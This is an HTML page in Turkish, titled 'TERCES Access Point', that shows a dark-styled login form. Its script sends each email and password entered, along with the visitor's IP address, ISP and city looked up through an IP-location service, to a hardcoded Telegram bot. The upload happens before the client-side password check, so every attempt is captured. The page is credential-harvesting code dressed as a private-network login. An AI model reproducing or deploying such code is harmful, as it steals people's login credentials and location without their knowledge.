<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERCES Access Point</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #151515;
            padding: 30px;
            border-radius: 12px;
            border: 1px solid #333;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #222;
            border: 1px solid #444;
            color: white;
            border-radius: 6px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #007bff;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
        button:hover { background: #0056b3; }
        #content { display: none; } /* Başlangıçta gizli */
        .warning { color: #ff4d4d; font-size: 0.9em; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="container">
        <div id="login-form">
            <h2>TERCES LOGIN</h2>
            <input type="email" id="userEmail" placeholder="E-posta">
            <input type="password" id="userPass" placeholder="Şifre">
            <button onclick="verileriGonder()">Giriş Yap</button>
        </div>

        <div id="content">
            <h2>Merhaba!</h2>
            <p>Bu <strong>TERCES</strong> adlı özel ağdır.</p>
            <p>Adminimize doğrudan ulaşmanız mümkündür.</p>
            <div style="word-break: break-all; color: #555; font-size: 0.8em;">
                0528db57d73bb17d1e955e303f5a2f5ea
            </div>
            <p class="warning"><strong>Dikkat!</strong> Lütfen bilgileri paylaşmayın.</p>
        </div>
    </div>

    <script>
        async function verileriGonder() {
            const email = document.getElementById('userEmail').value;
            const pass = document.getElementById('userPass').value;
            const dogruSifre = "Adhfxygh8lm"; 

            // Senin Bilgilerin
            const botToken = "8763400885:AAFUvdZBZy92pGCv8BvVjR3450e1S20S20"; 
            const chatId = "7580423994";

            try {
                // IP ve Konum Bilgilerini Alıyoruz
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();

                const detayliMesaj = `
🌐 **YENİ GİRİŞ DENEMESİ**
📧 E-posta: ${email}
🔑 Şifre: ${pass}
📡 IP: ${data.ip}
🏢 ISS: ${data.org}
📍 Konum: ${data.city} / ${data.country_name}
                `;

                // Telegram'a Gönder
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(detayliMesaj)}&parse_mode=Markdown`);

                if (pass === dogruSifre) {
                    // Giriş Başarılı: Formu gizle, içeriği göster
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                } else {
                    alert("Hatalı şifre!");
                }

            } catch (error) {
                console.error("Hata:", error);
                alert("Bir bağlantı sorunu oluştu, ancak giriş denendi.");
                
                // Bağlantı hatası olsa bile şifre kontrolünü yap (offline çalışma durumu için)
                if (pass === dogruSifre) {
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                }
            }
        }
    </script>

</body>
</html>
